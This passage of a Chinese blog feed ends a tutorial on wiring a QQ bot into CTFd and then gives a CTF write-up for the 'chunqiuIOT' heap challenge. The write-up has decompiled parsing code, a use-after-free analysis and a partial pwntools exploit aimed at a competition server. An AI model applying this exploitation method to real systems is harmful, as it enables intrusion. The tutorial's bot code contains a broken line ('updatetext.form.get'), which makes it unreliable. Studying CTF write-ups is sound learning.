id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h3><p>打开<code>CTFd/CTFd/views.py</code>，添加变量<code>createtext</code>和<code>updatetext</code>，用于接收html页面数据</p><p><img src="/img/article/botv2/image-20221108200717361.png" alt="image-20221108200717361"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Robot</span><br>bot = request.form.get(<span class="hljs-string">&quot;bot&quot;</span>)<br>bottext = request.form.get(<span class="hljs-string">&quot;bottext&quot;</span>)<br>createtext = request.form.get(<span class="hljs-string">&quot;createtext&quot;</span>)<br>updatetext = updatetext.form.get(<span class="hljs-string">&quot;updatetext&quot;</span>)<br>group_id = request.form.get(<span class="hljs-string">&quot;group_id&quot;</span>) <span class="hljs-comment">#qq群号</span><br>bot_ip = request.form.get(<span class="hljs-string">&quot;bot_ip&quot;</span>) <span class="hljs-comment">#机器人服务地址,如 127.0.0.1:8000</span><br>set_config(<span class="hljs-string">&quot;bot&quot;</span>, bot)<br>set_config(<span class="hljs-string">&quot;bottext&quot;</span>, bottext)<br>set_config(<span class="hljs-string">&quot;createtext&quot;</span>, createtext)<br>set_config(<span class="hljs-string">&quot;updatetext&quot;</span>, updatetext)<br>set_config(<span class="hljs-string">&quot;group_id&quot;</span>,group_id)<br>set_config(<span class="hljs-string">&quot;bot_ip&quot;</span>,bot_ip)<br></code></pre></td></tr></table></figure><h3 id="challenge-py"><a href="#challenge-py" class="headerlink" title="challenge.py"></a>challenge.py</h3><p>打开<code>CTFd/CTFD/api/v1/challenges.py</code>，在<code>patch</code>函数内增加一段代码，在更新题目信息后进行逻辑判断，后调用机器人的API</p><p><img src="/img/article/botv2/image-20221108201009252.png" alt="image-20221108201009252"></p><p>完整函数代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch</span>(<span class="hljs-params">self, challenge_id</span>):<br>    data = request.get_json()<br>    <span class="hljs-comment">#<span class="hljs-doctag">TODO:</span></span><br>    <span class="hljs-comment"># Load data through schema for validation but not for insertion</span><br>    schema = ChallengeSchema()<br>    response = schema.load(data)<br>    <span class="hljs-keyword">if</span> response.errors:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;errors&quot;</span>: response.errors&#125;, <span class="hljs-number">400</span><br><br>    challenge = Challenges.query.filter_by(<span class="hljs-built_in">id</span>=challenge_id).first_or_404()<br>    state_before = challenge.state<br>    challenge_class = get_chal_class(challenge.<span class="hljs-built_in">type</span>)<br>    challenge = challenge_class.update(challenge, request)<br>    response = challenge_class.read(challenge)<br>    <span class="hljs-comment">#ROBOT send message when update the information of challenge</span><br>    bot = get_config(<span class="hljs-string">&quot;bot&quot;</span>)<br>    <span class="hljs-keyword">if</span> (bot):<br>        group_id = get_config(<span class="hljs-string">&quot;group_id&quot;</span>)<br>        bot_ip = get_config(<span class="hljs-string">&quot;bot_ip&quot;</span>)<br>        boturl = <span class="hljs-string">&quot;http://&quot;</span>+<span class="hljs-built_in">str</span>(bot_ip)+<span class="hljs-string">&quot;/send_group_msg?group_id=&quot;</span>+<span class="hljs-built_in">str</span>(group_id)+<span class="hljs-string">&quot;&amp;message=&quot;</span><br>        <span class="hljs-keyword">if</span>(challenge.state!=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-keyword">and</span> challenge.state!=<span class="hljs-string">&quot;locked&quot;</span>):<br>            <span class="hljs-keyword">if</span>(state_before==<span class="hljs-string">&quot;hidden&quot;</span>):<br>                bottext = get_config(<span class="hljs-string">&quot;createtext&quot;</span>)<br>                botmessage = (bottext) % (challenge.name)<br>                url = boturl + botmessage<br>                requests.get(<span class="hljs-built_in">str</span>(url))<br>             <span class="hljs-keyword">elif</span>(state_before!=<span class="hljs-string">&quot;hidden&quot;</span>):<br>                bottext = get_config(<span class="hljs-string">&quot;updatetext&quot;</span>)<br>                botmessage = (bottext) % (challenge.name)<br>                url = boturl + botmessage<br>                requests.get(<span class="hljs-built_in">str</span>(url))<br><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&quot;data&quot;</span>: response&#125;<br></code></pre></td></tr></table></figure><blockquote><p>后续在增加一二三血吧，这个功能略有点麻烦</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>i春秋春季赛-勇者巅峰-chunqiuIOT</title>
    <link href="/2022/11/03/i%E6%98%A5%E7%A7%8B%E6%98%A5%E5%AD%A3%E8%B5%9B-%E5%8B%87%E8%80%85%E5%B7%85%E5%B3%B0-chunqiuIOT/"/>
    <url>/2022/11/03/i%E6%98%A5%E7%A7%8B%E6%98%A5%E5%AD%A3%E8%B5%9B-%E5%8B%87%E8%80%85%E5%B7%85%E5%B3%B0-chunqiuIOT/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是今年上半年比赛的一道题目，那个时候才刚刚接触堆，栈也不是很熟。打开程序基本就放弃了，前一段时间复现了几个IOT相关的CVE，借此契机顺便看看几个月前自己放弃的那道题。有一说一，这道题的逆向部分还是很头疼的，逆了一个下午+一个早上才看完程序逻辑—-套皮堆题罢了。</p><blockquote><p>我新建了一个库，用于存放各种比赛的题目，我博客内WP涉及的题目基本都能找到，链接：<a href="https://github.com/Loora1N/PWNchanllenge/tree/main/chunzhiIot">PWNchanllenge&#x2F;chunzhiIot at main · Loora1N&#x2F;PWNchanllenge (github.com)</a></p></blockquote><h2 id="逆向部分"><a href="#逆向部分" class="headerlink" title="逆向部分"></a>逆向部分</h2><p>首先找到主函数，比较简介，循环读入一个<code>0X3FF</code>字节，然后对<code>s</code>进行解析处理</p><p><img src="/img/article/chunqiuiot/image-20221103201403318.png" alt="image-20221103201403318"></p><p>跟进<code>1BDC</code>函数</p><p><img src="/img/article/chunqiuiot/image-20221103202054328.png" alt="image-20221103202054328"></p><p>这里有腾出了一个字符串空间，跟进<code>sub_1852</code>函数。</p><blockquote><p>因为我改了一部分变量名和函数名，所以可能与直接反汇编除了结果略有不同</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_1852</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> *haystack; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">int</span> cnt; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *front_part; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">char</span> *s2a; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2b; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  haystack = a1;<br>  cnt = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-built_in">strstr</span>(a1, <span class="hljs-string">&quot;\r\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v5 )<br>  &#123;<br>    v5[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>    *v5 = <span class="hljs-number">0</span>;<br>    v5 += <span class="hljs-number">2</span>;                                    <span class="hljs-comment">// trans &quot;\r\n&quot; into &quot;\x00&quot;+&quot; &quot;</span><br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v5 &amp;&amp; cnt &lt;= <span class="hljs-number">15</span> )<br>  &#123;<br>    front_part = strtok(haystack, <span class="hljs-string">&quot; &quot;</span>);<br>    <span class="hljs-keyword">if</span> ( cnt == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;GET&quot;</span>, front_part) )<br>      &#123;<br>        *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">1</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;HEAD&quot;</span>, front_part) )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;POST&quot;</span>, front_part) )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;PUT&quot;</span>, front_part) )<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;DELETE&quot;</span>, front_part) )<br>            &#123;<br>              <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;TRACE&quot;</span>, front_part) )<br>              &#123;<br>                <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;OPTIONS&quot;</span>, front_part) )<br>                &#123;<br>                  <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;CONNECT&quot;</span>, front_part) )<br>                  &#123;<br>                    <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;DEV&quot;</span>, front_part) )<br>                      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>                    *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">8</span>;<br>                  &#125;<br>                  <span class="hljs-keyword">else</span><br>                  &#123;<br>                    *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">7</span>;<br>                  &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                  *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">6</span>;<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span><br>              &#123;<br>                *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">5</span>;<br>              &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>              *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">4</span>;<br>            &#125;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">3</span>;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">2</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>;<br>      &#125;<br>      s2a = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot; &quot;</span>);<br>      <span class="hljs-keyword">if</span> ( s2a != <span class="hljs-built_in">strchr</span>(s2a, <span class="hljs-string">&#x27;/&#x27;</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      *a2 = s2a;<br>      s2b = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot; &quot;</span>);<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s2b, <span class="hljs-string">&quot;HTTP/1.0&quot;</span>) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(s2b, <span class="hljs-string">&quot;HTTP/1.1&quot;</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      haystack = v5;<br>      v5 = <span class="hljs-built_in">strstr</span>(v5, <span class="hljs-string">&quot;\r\n&quot;</span>);<br>      <span class="hljs-keyword">if</span> ( v5 )                                 <span class="hljs-comment">// same to the top</span><br>      &#123;<br>        v5[<span class="hljs-number">1</span>] = <span class="hljs-number">32</span>;<br>        *v5 = <span class="hljs-number">0</span>;<br>        v5 += <span class="hljs-number">2</span>;<br>      &#125;<br>      cnt = <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strchr</span>(front_part, <span class="hljs-string">&#x27;:&#x27;</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      haystack = v5;<br>      v5 = <span class="hljs-built_in">strstr</span>(v5, <span class="hljs-string">&quot;\r\n&quot;</span>);<br>      <span class="hljs-keyword">if</span> ( v5 )<br>      &#123;<br>        v5[<span class="hljs-number">1</span>] = <span class="hljs-number">32</span>;<br>        *v5 = <span class="hljs-number">0</span>;<br>        v5 += <span class="hljs-number">2</span>;<br>      &#125;<br>      ++cnt;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( cnt == <span class="hljs-number">1</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  *(a2 + <span class="hljs-number">8</span>) = haystack;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里是做了一个HTTP的报文解析，根据头的不同，有不同的返回值，并且会将报文结尾’\r\n’之后的字符串赋值给传进来的第二个参数。即这个函数主要干了三件事</p><ul><li>解析HTTP报文，确定函数返回值</li><li>根据请求类型赋值给<code>a2+16</code>不同的值</li><li>将附带字符串赋值给<code>a2+8</code>的地址</li></ul><p>我们继续看另外一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_15FD</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> choice; <span class="hljs-comment">// [rsp+14h] [rbp-2Ch]</span><br>  __int64 idx2; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 size; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  <span class="hljs-type">char</span> *nptr; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *nptra; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *nptrb; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">char</span> *pointer; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">char</span> *pointer2; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">if</span> ( *(a1 + <span class="hljs-number">16</span>) == <span class="hljs-number">2</span> )                        <span class="hljs-comment">// POST方法进入</span><br>  &#123;<br>    nptr = strtok(*(a1 + <span class="hljs-number">8</span>), <span class="hljs-string">&quot;&amp;&quot;</span>);              <span class="hljs-comment">// use &#x27;&amp;&#x27; to split the string</span><br>                                                <span class="hljs-comment">// choice &amp; idx</span><br>    <span class="hljs-keyword">if</span> ( !nptr )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    choice = *nptr;<br>    nptra = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( !nptra )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    idx = atoi(nptra);<br>    idx2 = idx;<br>    <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0x10</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !flag )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">4</span> )<br>    &#123;<br>      del(idx);                                 <span class="hljs-comment">// free(un4040+idx)</span><br>                                                <span class="hljs-comment">// UAF</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( choice &lt;= <span class="hljs-number">4</span> )<br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( choice )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>          show(idx);                            <span class="hljs-comment">// show(un4040+v2)</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:                                <span class="hljs-comment">// 1&amp;idx&amp;size&amp;pointer</span><br>          nptrb = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>          <span class="hljs-keyword">if</span> ( !nptrb )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          size = atoi(nptrb);<br>          <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x500</span> )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          pointer = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>          <span class="hljs-keyword">if</span> ( !pointer )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          create(idx2, size, pointer);          <span class="hljs-comment">// un4040+idx = malloc(size)</span><br>                                                <span class="hljs-comment">// memcpy(chunk,pointer,size)</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>          pointer2 = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>          <span class="hljs-keyword">if</span> ( !pointer2 )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          <span class="hljs-built_in">strcpy</span>(idx2, pointer2);               <span class="hljs-comment">//  memcpy(*(&amp;unk_4040 + idx), nptrd, str(nptrd))</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  result = *(a1 + <span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">8</span> )<br>  &#123;<br>    result = <span class="hljs-built_in">strcmp</span>(*(a1 + <span class="hljs-number">8</span>), <span class="hljs-string">&quot;rotartsinimda&quot;</span>);<span class="hljs-comment">// admin is trator</span><br>    <span class="hljs-keyword">if</span> ( !result )<br>      flag = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数主要干了这几件事</p><ul><li>根据<code>a1+16</code>的值不同，进入不同的判断分支(<code>a1+16</code>的值是由报文请求方式决定）</li><li>用<code>&amp;</code>分割了<code>a1+8</code>处的字符串，并根据字符串决定不同函数</li><li>实现了一般堆题目的几个函数</li></ul><blockquote><p>另外需要注意，要将flag置1才能进入堆操作的选单，所以先要进入最下面的字符串判断</p></blockquote><p><img src="/img/article/chunqiuiot/image-20221103203402587.png" alt="image-20221103203402587"></p><p>结合前面的分析，我们基本确定payload的形式为类似如下特征</p><p><code>POST / HTTP/1.1\r\n\x01&amp;1&amp;0x30&amp;aaaa</code></p><p>这个程序的漏洞主要在<code>free</code>这里，存在UAF漏洞</p><p><img src="/img/article/chunqiuiot/image-20221103203911463.png" alt="image-20221103203911463"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>基本利用就比较简单了，泄露<code>heapbase</code>和<code>libc</code>后劫持<code>free_hook</code>即可，这道题主要还是代码逻辑相对难一些😭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;210.30.97.133&#x27;</span>,<span class="hljs-number">28094</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-F&#x27;</span> <span class="hljs-string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="hljs-string">&#x27;-P&#x27;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;DEV / HTPP/1.1\r\nrotartsinimda\x00&quot;</span><br>    io.sendline(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx,size,text</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span>+<span class="hljs-string">&#x27;\x01&#x27;</span>+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(idx)+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(size)+<span class="hljs-string">&#x27;&amp;&#x27;</span>+ text<br>    io.sendline(payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span>+<span class="hljs-string">&#x27;\x04&#x27;</span>+<span 